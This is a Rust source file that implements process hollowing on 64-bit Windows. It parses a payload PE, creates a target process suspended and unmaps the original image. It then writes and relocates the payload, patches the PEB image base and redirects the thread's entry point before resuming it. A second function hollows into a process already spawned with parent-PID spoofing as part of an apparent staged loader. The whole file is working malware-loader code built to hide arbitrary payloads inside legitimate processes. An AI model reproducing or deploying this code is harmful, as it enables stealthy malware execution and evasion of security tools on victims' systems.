#![allow(unused)]

#[cfg(target_os = "windows")]
use windows_sys::Win32::{
    Foundation::CloseHandle,
    System::{
        Diagnostics::Debug::{GetThreadContext, SetThreadContext, CONTEXT},
        Threading::{CreateProcessA, PROCESS_INFORMATION, STARTUPINFOA, CREATE_SUSPENDED},
    },
};

// Process-hollowing PEB acquisition fix:
// On x64, GetThreadContext does NOT encode PEB base in any register after CREATE_SUSPENDED.
// The correct source is NtQueryInformationProcess(ProcessBasicInformation).
// Context is still needed to set the entry-point (Rcx) and resume the thread.

// CONTEXT_CONTROL | CONTEXT_INTEGER | CONTEXT_FLOATING_POINT for AMD64
// windows-sys 0.52 does not export this as a named constant
const CONTEXT_FULL_AMD64: u32 = 0x0010_000B;

const MEM_COMMIT: u32 = 0x1000;
const MEM_RESERVE: u32 = 0x2000;
const PAGE_READWRITE: u32 = 0x04;
const PAGE_EXECUTE_READ: u32 = 0x20;
const PAGE_READONLY: u32 = 0x02;

struct PeHeaders {
    image_base: u64,
    size_of_image: u32,
    size_of_headers: u32,
    entry_point_rva: u32,
    sections: Vec<SectionInfo>,
    reloc_rva: u32,
    reloc_size: u32,
}

struct SectionInfo {
    virtual_address: u32,
    virtual_size: u32,
    raw_offset: u32,
    raw_size: u32,
    characteristics: u32,
}

#[cfg(target_os = "windows")]
fn parse_pe_headers(pe: &[u8]) -> Option<PeHeaders> {
    if pe.len() < 64 {
        return None;
    }
    let e_magic = u16::from_le_bytes([pe[0], pe[1]]);
    if e_magic != 0x5A4D {
        return None;
    }
    let e_lfanew = u32::from_le_bytes([pe[0x3C], pe[0x3D], pe[0x3E], pe[0x3F]]) as usize;
    if pe.len() < e_lfanew + 4 {
        return None;
    }
    let sig = u32::from_le_bytes([pe[e_lfanew], pe[e_lfanew+1], pe[e_lfanew+2], pe[e_lfanew+3]]);
    if sig != 0x00004550 {
        return None;
    }
    let fh = e_lfanew + 4;
    if pe.len() < fh + 20 {
        return None;
    }
    let num_sections = u16::from_le_bytes([pe[fh+2], pe[fh+3]]) as usize;
    let size_of_opt = u16::from_le_bytes([pe[fh+16], pe[fh+17]]) as usize;
    let oh = fh + 20;
    if pe.len() < oh + size_of_opt {
        return None;
    }
    let magic = u16::from_le_bytes([pe[oh], pe[oh+1]]);
    if magic != 0x020B {
        // Only PE32+ supported
        return None;
    }
    let entry_point_rva = u32::from_le_bytes([pe[oh+16], pe[oh+17], pe[oh+18], pe[oh+19]]);
    let image_base = u64::from_le_bytes([
        pe[oh+24], pe[oh+25], pe[oh+26], pe[oh+27],
        pe[oh+28], pe[oh+29], pe[oh+30], pe[oh+31],
    ]);
    let size_of_image = u32::from_le_bytes([pe[oh+56], pe[oh+57], pe[oh+58], pe[oh+59]]);
    let size_of_headers = u32::from_le_bytes([pe[oh+60], pe[oh+61], pe[oh+62], pe[oh+63]]);
    let num_rva = u32::from_le_bytes([pe[oh+108], pe[oh+109], pe[oh+110], pe[oh+111]]) as usize;

    let reloc_rva;
    let reloc_size;
    if num_rva > 5 {
        let reloc_dd = oh + 112 + 5 * 8;
        if pe.len() >= reloc_dd + 8 {
            reloc_rva = u32::from_le_bytes([pe[reloc_dd], pe[reloc_dd+1], pe[reloc_dd+2], pe[reloc_dd+3]]);
            reloc_size = u32::from_le_bytes([pe[reloc_dd+4], pe[reloc_dd+5], pe[reloc_dd+6], pe[reloc_dd+7]]);
        } else {
            reloc_rva = 0;
            reloc_size = 0;
        }
    } else {
        reloc_rva = 0;
        reloc_size = 0;
    }

    let sh_base = oh + size_of_opt;
    let mut sections = Vec::with_capacity(num_sections);
    for i in 0..num_sections {
        let s = sh_base + i * 40;
        if pe.len() < s + 40 {
            break;
        }
        sections.push(SectionInfo {
            virtual_address: u32::from_le_bytes([pe[s+12], pe[s+13], pe[s+14], pe[s+15]]),
            virtual_size:    u32::from_le_bytes([pe[s+8],  pe[s+9],  pe[s+10], pe[s+11]]),
            raw_offset:      u32::from_le_bytes([pe[s+20], pe[s+21], pe[s+22], pe[s+23]]),
            raw_size:        u32::from_le_bytes([pe[s+16], pe[s+17], pe[s+18], pe[s+19]]),
            characteristics: u32::from_le_bytes([pe[s+36], pe[s+37], pe[s+38], pe[s+39]]),
        });
    }

    Some(PeHeaders {
        image_base,
        size_of_image,
        size_of_headers,
        entry_point_rva,
        sections,
        reloc_rva,
        reloc_size,
    })
}

#[cfg(target_os = "windows")]
pub fn inject_hollow(target_exe: &str, payload_pe: &[u8]) -> super::InjectResult {
    use crate::syscall::{nt_alloc, nt_write, nt_protect, nt_read, nt_unmap_view, nt_resume_thread};
    use core::ptr::null_mut;
    use std::ffi::CString;

    let headers = parse_pe_headers(payload_pe).ok_or("invalid PE")?;

    let exe_cstr = CString::new(target_exe).map_err(|_| "invalid exe path")?;
    let mut si: STARTUPINFOA = unsafe { core::mem::zeroed() };
    si.cb = core::mem::size_of::<STARTUPINFOA>() as u32;
    let mut pi: PROCESS_INFORMATION = unsafe { core::mem::zeroed() };

    let ok = unsafe {
        CreateProcessA(
            exe_cstr.as_ptr() as *const u8,
            null_mut(), null_mut(), null_mut(), 0,
            CREATE_SUSPENDED, null_mut(), null_mut(),
            &mut si, &mut pi,
        )
    };
    if ok == 0 {
        return Err("CreateProcessA failed");
    }

    let proc   = pi.hProcess as isize;
    let thread = pi.hThread  as isize;

    // Get PEB base via NtQueryInformationProcess(ProcessBasicInformation).
    // On x64 CREATE_SUSPENDED, no general-purpose register carries the PEB address.
    use crate::syscall::{ProcessBasicInformation, nt_query_information_process};
    let mut pbi: ProcessBasicInformation = unsafe { core::mem::zeroed() };
    let mut ret_len: u32 = 0;
    let status = unsafe {
        nt_query_information_process(
            proc,
            0, // ProcessBasicInformation
            &mut pbi as *mut ProcessBasicInformation as *mut u8,
            core::mem::size_of::<ProcessBasicInformation>() as u32,
            &mut ret_len,
        )
    };
    if status < 0 || pbi.peb_base_address == 0 {
        unsafe { CloseHandle(pi.hProcess as _); CloseHandle(pi.hThread as _); }
        return Err("NtQueryInformationProcess failed");
    }
    let peb_base = pbi.peb_base_address as u64;

    // Read PEB.ImageBaseAddress (offset 0x10 on x64)
    let mut image_base_remote: u64 = 0;
    let mut nread: usize = 0;
    let status = unsafe {
        nt_read(
            proc,
            (peb_base + 0x10) as *const u8,
            &mut image_base_remote as *mut u64 as *mut u8,
            8,
            &mut nread,
        )
    };
    if status < 0 {
        unsafe { CloseHandle(pi.hProcess as _); CloseHandle(pi.hThread as _); }
        return Err("read peb failed");
    }

    // Thread context is needed only for the entry-point redirect below.
    let mut ctx: CONTEXT = unsafe { core::mem::zeroed() };
    ctx.ContextFlags = CONTEXT_FULL_AMD64;
    if unsafe { GetThreadContext(pi.hThread as _, &mut ctx) } == 0 {
        unsafe { CloseHandle(pi.hProcess as _); CloseHandle(pi.hThread as _); }
        return Err("GetThreadContext failed");
    }

    // Unmap original image
    unsafe {
        nt_unmap_view(proc, image_base_remote as *mut u8);
    }

    // Allocate at preferred base; fall back to 0 if the VA is occupied
    let mut new_base: *mut u8 = headers.image_base as *mut u8;
    let mut alloc_size: usize = headers.size_of_image as usize;
    let status = unsafe {
        nt_alloc(proc, &mut new_base, 0, &mut alloc_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)
    };
    let new_base = if status < 0 || new_base.is_null() {
        let mut fallback: *mut u8 = null_mut();
        let status = unsafe {
            nt_alloc(proc, &mut fallback, 0, &mut alloc_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)
        };
        if status < 0 || fallback.is_null() {
            unsafe { CloseHandle(pi.hProcess as _); CloseHandle(pi.hThread as _); }
            return Err("alloc failed");
        }
        fallback
    } else {
        new_base
    };

    // Write headers
    let mut written: usize = 0;
    let status = unsafe {
        nt_write(proc, new_base, payload_pe.as_ptr(), headers.size_of_headers as usize, &mut written)
    };
    if status < 0 {
        unsafe { CloseHandle(pi.hProcess as _); CloseHandle(pi.hThread as _); }
        return Err("write headers failed");
    }

    // Write sections
    for sec in &headers.sections {
        if sec.raw_size == 0 || sec.raw_offset == 0 { continue; }
        let src_start = sec.raw_offset as usize;
        let src_end = src_start.saturating_add(sec.raw_size as usize);
        if src_end > payload_pe.len() { continue; }
        let dest = unsafe { new_base.add(sec.virtual_address as usize) };
        let mut w: usize = 0;
        unsafe {
            nt_write(proc, dest, payload_pe.as_ptr().add(src_start), sec.raw_size as usize, &mut w);
        }
    }

    // Apply base relocations if load address differs from preferred
    let delta = new_base as i64 - headers.image_base as i64;
    if delta != 0 && headers.reloc_rva != 0 && headers.reloc_size != 0 {
        apply_relocations(proc, new_base, payload_pe, headers.reloc_rva, headers.reloc_size, delta);
    }

    // Set section permissions
    for sec in &headers.sections {
        const IMAGE_SCN_MEM_EXECUTE: u32 = 0x20000000;
        const IMAGE_SCN_MEM_WRITE: u32 = 0x80000000;
        const IMAGE_SCN_MEM_READ: u32 = 0x40000000;
        let prot = match (
            sec.characteristics & IMAGE_SCN_MEM_EXECUTE != 0,
            sec.characteristics & IMAGE_SCN_MEM_WRITE != 0,
        ) {
            (true, _) => PAGE_EXECUTE_READ,
            (false, true) => PAGE_READWRITE,
            _ => PAGE_READONLY,
        };
        let mut sec_base = unsafe { new_base.add(sec.virtual_address as usize) };
        let mut sec_size = sec.virtual_size as usize;
        let mut old: u32 = 0;
        unsafe { nt_protect(proc, &mut sec_base, &mut sec_size, prot, &mut old); }
    }

    // Patch PEB.ImageBaseAddress
    let new_base_val: u64 = new_base as u64;
    let mut w: usize = 0;
    unsafe {
        nt_write(
            proc,
            (peb_base + 0x10) as *mut u8,
            &new_base_val as *const u64 as *const u8,
            8,
            &mut w,
        );
    }

    // On x64, the suspended thread is parked at LdrInitializeThunk.
    // RCX holds the starting address that will be passed to BaseThreadInitThunk.
    // Redirect it to our hollowed PE entry point; leave Rdx (thread param) unchanged.
    ctx.Rcx = new_base as u64 + headers.entry_point_rva as u64;
    if unsafe { SetThreadContext(pi.hThread as _, &ctx) } == 0 {
        unsafe { CloseHandle(pi.hProcess as _); CloseHandle(pi.hThread as _); }
        return Err("SetThreadContext failed");
    }

    let mut suspend_count: u32 = 0;
    unsafe {
        nt_resume_thread(thread, &mut suspend_count);
        CloseHandle(pi.hProcess as _);
        CloseHandle(pi.hThread as _);
    }

    Ok(())
}

/// Variant of inject_hollow that operates on a pre-existing suspended (proc, thread) pair
/// rather than spawning the target itself. Used by do_staged_load (Step 6) to hollow
/// into a process that was already spawned with PPID-spoofing.
#[cfg(target_os = "windows")]
pub fn hollow_into_process(proc: isize, thread: isize, payload_pe: &[u8]) -> super::InjectResult {
    use crate::syscall::{
        nt_alloc, nt_write, nt_protect, nt_read, nt_unmap_view, nt_resume_thread,
        ProcessBasicInformation, nt_query_information_process,
    };
    use core::ptr::null_mut;

    let headers = parse_pe_headers(payload_pe).ok_or("hollow_into: invalid PE")?;

    // Locate the target's PEB to find and unmap its original image.
    let mut pbi: ProcessBasicInformation = unsafe { core::mem::zeroed() };
    let mut ret_len: u32 = 0;
    if unsafe {
        nt_query_information_process(
            proc, 0,
            &mut pbi as *mut _ as *mut u8,
            core::mem::size_of::<ProcessBasicInformation>() as u32,
            &mut ret_len,
        )
    } < 0 || pbi.peb_base_address == 0 {
        return Err("hollow_into: NtQueryInformationProcess failed");
    }
    let peb = pbi.peb_base_address as u64;

    let mut orig_base: u64 = 0;
    let mut nr: usize = 0;
    if unsafe { nt_read(proc, (peb + 0x10) as *const u8,
                        &mut orig_base as *mut u64 as *mut u8, 8, &mut nr) } < 0 {
        return Err("hollow_into: PEB read failed");
    }

    // Capture thread context before we touch memory (needed for entry-point redirect).
    let mut ctx: CONTEXT = unsafe { core::mem::zeroed() };
    ctx.ContextFlags = CONTEXT_FULL_AMD64;
    if unsafe { GetThreadContext(thread as _, &mut ctx) } == 0 {
        return Err("hollow_into: GetThreadContext failed");
    }

    unsafe { nt_unmap_view(proc, orig_base as *mut u8) };

    // Allocate space for our PE.
    let mut new_base: *mut u8 = headers.image_base as *mut u8;
    let mut sz: usize = headers.size_of_image as usize;
    let new_base = if unsafe {
        nt_alloc(proc, &mut new_base, 0, &mut sz, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)
    } < 0 || new_base.is_null() {
        let mut fb: *mut u8 = null_mut();
        if unsafe {
            nt_alloc(proc, &mut fb, 0, &mut sz, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)
        } < 0 || fb.is_null() {
            return Err("hollow_into: alloc failed");
        }
        fb
    } else { new_base };

    // Write headers.
    let mut w: usize = 0;
    if unsafe { nt_write(proc, new_base, payload_pe.as_ptr(),
                         headers.size_of_headers as usize, &mut w) } < 0 {
        return Err("hollow_into: write headers failed");
    }
    // Write sections.
    for sec in &headers.sections {
        if sec.raw_size == 0 || sec.raw_offset == 0 { continue; }
        let end = (sec.raw_offset as usize).saturating_add(sec.raw_size as usize);
        if end > payload_pe.len() { continue; }
        let dst = unsafe { new_base.add(sec.virtual_address as usize) };
        unsafe { nt_write(proc, dst, payload_pe.as_ptr().add(sec.raw_offset as usize),
                          sec.raw_size as usize, &mut w) };
    }

    // Apply base relocations if the load address differs from the preferred base.
    let delta = new_base as i64 - headers.image_base as i64;
    if delta != 0 && headers.reloc_rva != 0 {
        apply_relocations(proc, new_base, payload_pe,
                          headers.reloc_rva, headers.reloc_size, delta);
    }

    // Set section permissions.
    for sec in &headers.sections {
        const MEM_X: u32 = 0x2000_0000;
        const MEM_W: u32 = 0x8000_0000;
        let prot = match (sec.characteristics & MEM_X != 0, sec.characteristics & MEM_W != 0) {
            (true, _) => PAGE_EXECUTE_READ,
            (_, true) => PAGE_READWRITE,
            _         => PAGE_READONLY,
        };
        let mut sb = unsafe { new_base.add(sec.virtual_address as usize) };
        let mut ss = sec.virtual_size as usize;
        let mut old: u32 = 0;
        unsafe { nt_protect(proc, &mut sb, &mut ss, prot, &mut old) };
    }

    // Patch PEB.ImageBaseAddress.
    let nb64: u64 = new_base as u64;
    unsafe { nt_write(proc, (peb + 0x10) as *mut u8,
                      &nb64 as *const u64 as *const u8, 8, &mut w) };

    // Redirect suspended thread entry point to our PE entry.
    ctx.Rcx = new_base as u64 + headers.entry_point_rva as u64;
    if unsafe { SetThreadContext(thread as _, &ctx) } == 0 {
        return Err("hollow_into: SetThreadContext failed");
    }

    let mut sc: u32 = 0;
    unsafe { nt_resume_thread(thread, &mut sc) };
    Ok(())
}

#[cfg(target_os = "windows")]
fn apply_relocations(
    proc: isize,
    new_base: *mut u8,
    pe: &[u8],
    reloc_rva: u32,
    reloc_size: u32,
    delta: i64,
) {
    use crate::syscall::{nt_read, nt_write};

    let mut offset = reloc_rva as usize;
    let end = reloc_rva as usize + reloc_size as usize;

    while offset + 8 <= end && offset + 8 <= pe.len() {
        let page_rva = u32::from_le_bytes([pe[offset], pe[offset+1], pe[offset+2], pe[offset+3]]);
        let block_size = u32::from_le_bytes([pe[offset+4], pe[offset+5], pe[offset+6], pe[offset+7]]) as usize;
        if block_size < 8 { break; }
        let entries = (block_size - 8) / 2;
        for i in 0..entries {
            let entry_off = offset + 8 + i * 2;
            if entry_off + 2 > pe.len() { break; }
            let entry = u16::from_le_bytes([pe[entry_off], pe[entry_off+1]]);
            let reloc_type = entry >> 12;
            let reloc_offset = (entry & 0x0FFF) as u32;
            if reloc_type == 10 {
                // IMAGE_REL_BASED_DIR64
                let target_rva = page_rva + reloc_offset;
                let target_addr = unsafe { new_base.add(target_rva as usize) };
                let mut current: u64 = 0;
                let mut nread: usize = 0;
                unsafe {
                    nt_read(proc, target_addr as *const u8, &mut current as *mut u64 as *mut u8, 8, &mut nread);
                    let patched = (current as i64).wrapping_add(delta) as u64;
                    let mut nw: usize = 0;
                    nt_write(proc, target_addr, &patched as *const u64 as *const u8, 8, &mut nw);
                }
            }
        }
        offset += block_size;
    }
}
